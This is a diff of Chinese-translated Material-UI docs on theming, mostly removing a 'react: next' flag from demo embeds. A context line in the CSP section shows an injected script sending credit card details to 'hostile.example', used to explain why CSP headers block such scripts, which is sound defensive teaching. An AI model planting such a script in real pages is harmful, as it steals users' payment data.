@@ -6,7 +6,7 @@
 
 将 `ThemeProvider` 添加到应用程序的顶层，以访问React组件树中的主题。 然后，您可以在样式函数中访问主题对象。
 
-{{"demo": "pages/css-in-js/advanced/Theming.js", "react": "next"}}
+{{"demo": "pages/css-in-js/advanced/Theming.js"}}
 
 ## 访问组件中的主题
 
@@ -14,11 +14,11 @@
 
 ### `useTheme` hook
 
-{{"demo": "pages/css-in-js/advanced/UseTheme.js", "react": "next"}}
+{{"demo": "pages/css-in-js/advanced/UseTheme.js"}}
 
 ### `withTheme` HOC
 
-{{"demo": "pages/css-in-js/advanced/WithTheme.js", "react": "next"}}
+{{"demo": "pages/css-in-js/advanced/WithTheme.js"}}
 
 ## 主题嵌套
 
@@ -33,7 +33,7 @@
 </ThemeProvider>
 ```
 
-{{"demo": "pages/css-in-js/advanced/ThemeNesting.js", "react": "next"}}
+{{"demo": "pages/css-in-js/advanced/ThemeNesting.js"}}
 
 内的主题将 **倍率** 外的主题。 您可以通过提供一个函数来扩展外部主题：
 
@@ -269,7 +269,7 @@ const Button = withStyles(styles, { name: 'button' })(ButtonBase);
     <script>
       sendCreditCardDetails('https://hostile.example');
     </script>
-    
+
 
 此漏洞允许攻击者执行任何操作。 但是，使用安全的CSP标头，浏览器将不会加载此脚本。
 
